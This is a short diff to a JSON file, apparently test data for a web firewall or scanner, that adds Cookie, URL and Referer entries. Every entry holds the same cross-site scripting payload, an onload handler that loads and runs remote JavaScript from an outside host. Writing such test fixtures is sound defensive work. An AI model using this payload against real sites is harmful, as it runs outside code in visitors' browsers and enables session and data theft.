@@ -5,7 +5,10 @@
       "UA": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
       "Body": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
       "ARGS": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
-      "Headers": "CustomHeader: onload=x=>$.getScript('//brutelogic.com.br/2.js')"
+      "Cookie": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+      "URL": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+      "Referer": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+      "Headers": "onload=x=>$.getScript('//brutelogic.com.br/2.js')"
     }
   ]
 }
